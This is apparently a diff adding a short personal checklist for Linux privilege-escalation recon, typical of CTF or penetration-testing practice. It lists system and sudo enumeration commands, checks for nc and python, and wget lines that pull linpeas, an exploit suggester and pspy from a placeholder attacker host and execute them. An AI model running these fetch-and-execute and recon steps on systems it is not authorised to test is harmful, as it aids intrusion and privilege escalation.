@@ -1,0 +1,33 @@
+id
+
+whoami
+
+uname -a
+
+cat /etc/*release*
+
+cat /proc/version
+
+which python2|python3  (for ptty reasons)
+
+which wget  (obv)
+
+which nc  (if ur lucky)
+
+sudo -l
+
+cat /etc/exports
+
+
+### SCRIPTS I THEN RUN ###
+wget http://my.box.ip.addr:port/linpeas.sh -O linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee peas.out
+
+wget http://my.box.ip.addr:port/linux-exploit-suggester.sh -O les.sh
+chmod +x les.sh
+./les.sh | tee suggs.out
+
+wget http://my.box.ip.addr:port/pyspy -O pspy
+chmod +x pspy
+./pspy
